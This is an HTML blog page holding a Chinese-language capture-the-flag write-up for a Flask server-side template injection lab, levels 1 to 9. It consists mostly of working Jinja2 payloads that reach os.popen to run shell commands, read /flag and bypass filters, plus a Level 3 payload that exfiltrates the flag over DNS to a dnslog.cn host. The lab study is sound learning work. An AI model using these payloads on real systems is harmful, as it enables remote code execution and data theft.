@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="放假了，终于能安心学了  Level 1 12345678910查看所有的继承关系&#123;&#123;&#x27;&#x27;.__class__.__mro__&#125;&#125; 查看父类的所有子类&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()&#125;&#125;FUzz所有子类&#123;&amp;#">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ssti-Flask-Labs-[1-13]-wp">
+<meta property="og:url" content="http://example.com/2025/01/13/Ssti-Flask-Labs-[1-13]-wp/index.html">
+<meta property="og:site_name" content="Plazx&#39;s Blog">
+<meta property="og:description" content="放假了，终于能安心学了  Level 1 12345678910查看所有的继承关系&#123;&#123;&#x27;&#x27;.__class__.__mro__&#125;&#125; 查看父类的所有子类&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()&#125;&#125;FUzz所有子类&#123;&amp;#">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40918973/1736507347072-3213ffc9-5619-45de-baff-476962582583.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40918973/1736510100554-9f8478e8-fe17-4169-9a4f-860ce0f07f01.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40918973/1736604376204-7e6d0598-3c00-4fd4-9ab7-113eb3c0c1e3.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40918973/1736607906615-ac7a5847-461a-4662-9afc-86e58c297944.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40918973/1736661354952-6cf5c26b-42ee-4685-9a05-1e69535671f3.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40918973/1736749892430-5fcbed4f-5845-457f-bd2c-1e6ac0b6ddab.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40918973/1736758657414-05620007-e7e8-4057-9242-62f5c5cb9cbb.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40918973/1736772716508-63a88049-4f1f-4fe0-8d44-3dde5fbeca2b.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/40918973/1736773729011-97cd53d6-c657-4eae-bb84-acfbf9d78d92.png">
+<meta property="article:published_time" content="2025-01-12T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-01-13T14:16:55.687Z">
+<meta property="article:author" content="Plazx">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2025/png/40918973/1736507347072-3213ffc9-5619-45de-baff-476962582583.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Ssti-Flask-Labs-[1-13]-wp</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/NekoSec">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">Friend Links</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/01/11/2024%E5%BF%B5%E5%BF%B5%E7%A2%8E/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/01/13/Ssti-Flask-Labs-[1-13]-wp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/01/13/Ssti-Flask-Labs-[1-13]-wp/&text=Ssti-Flask-Labs-[1-13]-wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/01/13/Ssti-Flask-Labs-[1-13]-wp/&title=Ssti-Flask-Labs-[1-13]-wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/01/13/Ssti-Flask-Labs-[1-13]-wp/&is_video=false&description=Ssti-Flask-Labs-[1-13]-wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Ssti-Flask-Labs-[1-13]-wp&body=Check out this article: http://example.com/2025/01/13/Ssti-Flask-Labs-[1-13]-wp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/01/13/Ssti-Flask-Labs-[1-13]-wp/&title=Ssti-Flask-Labs-[1-13]-wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/01/13/Ssti-Flask-Labs-[1-13]-wp/&title=Ssti-Flask-Labs-[1-13]-wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/01/13/Ssti-Flask-Labs-[1-13]-wp/&title=Ssti-Flask-Labs-[1-13]-wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/01/13/Ssti-Flask-Labs-[1-13]-wp/&title=Ssti-Flask-Labs-[1-13]-wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/01/13/Ssti-Flask-Labs-[1-13]-wp/&name=Ssti-Flask-Labs-[1-13]-wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/01/13/Ssti-Flask-Labs-[1-13]-wp/&t=Ssti-Flask-Labs-[1-13]-wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sj9j3"><span class="toc-number">1.</span> <span class="toc-text">Level 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hDxWL"><span class="toc-number">2.</span> <span class="toc-text">Level 2 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kQsER"><span class="toc-number">3.</span> <span class="toc-text">Level 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#d9g8X"><span class="toc-number">4.</span> <span class="toc-text">Level 4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ajyfk"><span class="toc-number">5.</span> <span class="toc-text">Level 5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#t9SSF"><span class="toc-number">6.</span> <span class="toc-text">Level 6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vh5Xp"><span class="toc-number">7.</span> <span class="toc-text">Level 7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XIkwl"><span class="toc-number">8.</span> <span class="toc-text">Level 8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pqwfy"><span class="toc-number">9.</span> <span class="toc-text">Level 9</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Ssti-Flask-Labs-[1-13]-wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Plazx</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-01-12T16:00:00.000Z" class="dt-published" itemprop="datePublished">2025-01-13</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <meta name="referrer" content="no-referrer" />
+
+
+
+<blockquote>
+<p>放假了，终于能安心学了</p>
+</blockquote>
+<h2 id="sj9j3">Level 1</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">查看所有的继承关系</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__&#125;&#125; </span><br><span class="line">查看父类的所有子类</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()&#125;&#125;</span><br><span class="line">FUzz所有子类</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[&#123;&#123;<span class="built_in">int</span>(<span class="number">0</span>-<span class="number">500</span>)&#125;&#125;]&#125;&#125;</span><br><span class="line">或者直接用内嵌<span class="built_in">eval</span>加载，再结果里面查找<span class="built_in">eval</span></span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[&#123;&#123;<span class="built_in">int</span>(<span class="number">0</span>-<span class="number">500</span>)&#125;&#125;].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]&#125;&#125;</span><br><span class="line">用<span class="number">81</span>这个</span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">81</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/40918973/1736507347072-3213ffc9-5619-45de-baff-476962582583.png"></p>
+<h2 id="hDxWL">Level 2 </h2>
+过滤了双左大括号 用jafhajlkf绕过
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">依然采用Level <span class="number">1</span> 的Payload</span><br><span class="line">&#123;% <span class="built_in">print</span>().__class__.__base__.__subclasses__()[<span class="number">81</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>)%&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/40918973/1736510100554-9f8478e8-fe17-4169-9a4f-860ce0f07f01.png"></p>
+<h2 id="kQsER">Level 3</h2>
+无回显SSti
+
+<p>用dns外带</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">依然采用Level <span class="number">1</span> 的Payload</span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[X].__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ping `cat /flag | base64`.r1j496.dnslog.cn&quot;).read()&#x27;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="d9g8X">Level 4</h2>
+`bl['[', ']']`过滤了左右中括号`[]`
+
+<p>利用<code>__getitem__()</code>绕过中括号过滤，<code>__getitem__()</code>是一种魔术方法</p>
+<p><strong>对字典使用时，传入字符串，返回字典相应键所对应的值，当对列表使用时，传入整数返回列表对应索引的值</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()&#125;&#125; </span><br><span class="line">返回的是一个列表(中括号包裹)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/40918973/1736604376204-7e6d0598-3c00-4fd4-9ab7-113eb3c0c1e3.png"></p>
+<p>那么用<code>__getitem__()</code>来绕过</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FUzz所有类</span><br><span class="line">&#123;&#123; <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__().__getitem__(&#123;&#123;<span class="built_in">int</span>(<span class="number">0</span>-<span class="number">500</span>)&#125;&#125;)&#125;&#125;</span><br><span class="line">FUzz模块，这里返回的是字典(大括号包裹)</span><br><span class="line">&#123;&#123; <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__().__getitem__(&#123;&#123;<span class="built_in">int</span>(<span class="number">0</span>-<span class="number">500</span>)&#125;&#125;).__init__.__globals__&#125;&#125;</span><br><span class="line">注意这里是字典,调用<span class="built_in">eval</span>执行</span><br><span class="line">&#123;&#123; <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__().__getitem__(&#123;&#123;<span class="built_in">int</span>(<span class="number">117</span>)&#125;&#125;).__init__.__globals__.__builtins__.__getitem__(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/40918973/1736607906615-ac7a5847-461a-4662-9afc-86e58c297944.png"></p>
+<h2 id="ajyfk">Level 5</h2>
+`bl['\'', '"']`过滤了单引号和双引号` ' "`
+
+<p>用request来绕过</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">获取get提交数据:&#123;&#123;request.args.key&#125;&#125;</span><br><span class="line">获取POST提交数据:&#123;&#123;request.form.key&#125;&#125;</span><br><span class="line">获取cookie提交数据:&#123;&#123;request.cookies.key&#125;&#125;</span><br><span class="line"></span><br><span class="line">key均为参数名称</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">先来查找一下那里加载了request</span><br><span class="line">Fuzz所有类，request可以在<span class="string">&#x27;os._wrap_close&#x27;</span>找到</span><br><span class="line">&#123;&#123; ().__class__.__base__.__subclasses__()[&#123;&#123;<span class="built_in">int</span>(<span class="number">0</span>-<span class="number">500</span>)&#125;&#125;].__init__.__globals__&#125;&#125;</span><br><span class="line">用Post传参从而绕过了引号</span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">117</span>].__init__.__globals__[request.form.key1](request.form.key2).read()&#125;&#125;&amp;key1=popen&amp;key2=cat /flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/40918973/1736661354952-6cf5c26b-42ee-4685-9a05-1e69535671f3.png"></p>
+<h2 id="t9SSF">Level 6</h2>
+`bl['_']`过滤下划线`_` 利用过滤器配合request来过滤
+
+<p>可以用过滤器，但是用Request更加方便</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/40918973/1736749892430-5fcbed4f-5845-457f-bd2c-1e6ac0b6ddab.png"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">获取子类</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>[request.form.key1][request.form.key2][<span class="number">-1</span>][request.form.key3]()&#125;&#125;<span class="operator">&amp;</span>key1<span class="operator">=</span>__class__<span class="operator">&amp;</span>key2<span class="operator">=</span>__mro__<span class="operator">&amp;</span>key3<span class="operator">=</span>__subclasses__</span><br><span class="line">！！！下面这段代码不行！！！</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>[request.form.key1][request.form.key2][<span class="number">-1</span>][request.form.key3]()&#125;&#125;<span class="operator">&amp;</span>key1<span class="operator">=</span>__class__<span class="operator">&amp;</span>key2<span class="operator">=</span>__mro__<span class="operator">&amp;</span>key3<span class="operator">=</span>__subclasses__</span><br><span class="line">执行命令</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>[request.form.key1][request.form.key2][<span class="number">-1</span>][request.form.key3]()[&#123;&#123;<span class="type">int</span>(<span class="number">0</span><span class="number">-500</span>)&#125;&#125;][request.form.key4][request.form.key5][<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;<span class="operator">&amp;</span>key1<span class="operator">=</span>__class__<span class="operator">&amp;</span>key2<span class="operator">=</span>__mro__<span class="operator">&amp;</span>key3<span class="operator">=</span>__subclasses__<span class="operator">&amp;</span>key4<span class="operator">=</span>__init__<span class="operator">&amp;</span>key5<span class="operator">=</span>__globals__</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/40918973/1736758657414-05620007-e7e8-4057-9242-62f5c5cb9cbb.png"></p>
+<h2 id="Vh5Xp">Level 7</h2>
+`bl['.']` 过滤`.`用中括号[代替点
+
+<p>除了可以使用点”来访问对象属性外,还可以使用中括号</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;__class__&#x27;</span>][<span class="string">&#x27;__mro__&#x27;</span>][<span class="number">-1</span>][<span class="string">&#x27;__subclasses__&#x27;</span>]()[<span class="number">117</span>][<span class="string">&#x27;__init__&#x27;</span>][<span class="string">&#x27;__globals__&#x27;</span>][<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>)[<span class="string">&#x27;read&#x27;</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/40918973/1736772716508-63a88049-4f1f-4fe0-8d44-3dde5fbeca2b.png"></p>
+<h2 id="XIkwl">Level 8</h2>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">过滤了一系列关键字</span><br><span class="line">bl[&quot;class&quot;, &quot;arg&quot;, &quot;form&quot;, &quot;value&quot;, &quot;data&quot;, &quot;request&quot;, &quot;init&quot;, &quot;global&quot;, &quot;open&quot;, &quot;mro&quot;, &quot;base&quot;, &quot;attr&quot;]</span><br></pre></td></tr></table></figure>
+
+<p>最简单的方法，直接用+拼接</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;__cl&#x27;</span><span class="operator">+</span><span class="string">&#x27;ass__&#x27;</span>][<span class="string">&#x27;__mr&#x27;</span><span class="operator">+</span><span class="string">&#x27;o__&#x27;</span>][<span class="number">-1</span>][<span class="string">&#x27;__subcl&#x27;</span><span class="operator">+</span><span class="string">&#x27;asses__&#x27;</span>]()[<span class="number">117</span>][<span class="string">&#x27;__in&#x27;</span><span class="operator">+</span><span class="string">&#x27;it__&#x27;</span>][<span class="string">&#x27;__glo&#x27;</span><span class="operator">+</span><span class="string">&#x27;bals__&#x27;</span>][<span class="string">&#x27;pop&#x27;</span><span class="operator">+</span><span class="string">&#x27;en&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>)[<span class="string">&#x27;read&#x27;</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/40918973/1736773729011-97cd53d6-c657-4eae-bb84-acfbf9d78d92.png"></p>
+<h2 id="pqwfy">Level 9</h2>
+`bl['0-9']`过滤了数字  
+ 
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/NekoSec">Projects</a></li>
+        
+          <li><a href="/links/">Friend Links</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sj9j3"><span class="toc-number">1.</span> <span class="toc-text">Level 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hDxWL"><span class="toc-number">2.</span> <span class="toc-text">Level 2 </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kQsER"><span class="toc-number">3.</span> <span class="toc-text">Level 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#d9g8X"><span class="toc-number">4.</span> <span class="toc-text">Level 4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ajyfk"><span class="toc-number">5.</span> <span class="toc-text">Level 5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#t9SSF"><span class="toc-number">6.</span> <span class="toc-text">Level 6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vh5Xp"><span class="toc-number">7.</span> <span class="toc-text">Level 7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XIkwl"><span class="toc-number">8.</span> <span class="toc-text">Level 8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pqwfy"><span class="toc-number">9.</span> <span class="toc-text">Level 9</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/01/13/Ssti-Flask-Labs-[1-13]-wp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/01/13/Ssti-Flask-Labs-[1-13]-wp/&text=Ssti-Flask-Labs-[1-13]-wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/01/13/Ssti-Flask-Labs-[1-13]-wp/&title=Ssti-Flask-Labs-[1-13]-wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/01/13/Ssti-Flask-Labs-[1-13]-wp/&is_video=false&description=Ssti-Flask-Labs-[1-13]-wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Ssti-Flask-Labs-[1-13]-wp&body=Check out this article: http://example.com/2025/01/13/Ssti-Flask-Labs-[1-13]-wp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/01/13/Ssti-Flask-Labs-[1-13]-wp/&title=Ssti-Flask-Labs-[1-13]-wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/01/13/Ssti-Flask-Labs-[1-13]-wp/&title=Ssti-Flask-Labs-[1-13]-wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/01/13/Ssti-Flask-Labs-[1-13]-wp/&title=Ssti-Flask-Labs-[1-13]-wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/01/13/Ssti-Flask-Labs-[1-13]-wp/&title=Ssti-Flask-Labs-[1-13]-wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/01/13/Ssti-Flask-Labs-[1-13]-wp/&name=Ssti-Flask-Labs-[1-13]-wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/01/13/Ssti-Flask-Labs-[1-13]-wp/&t=Ssti-Flask-Labs-[1-13]-wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2077
+    Plazx
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/NekoSec">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">Friend Links</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
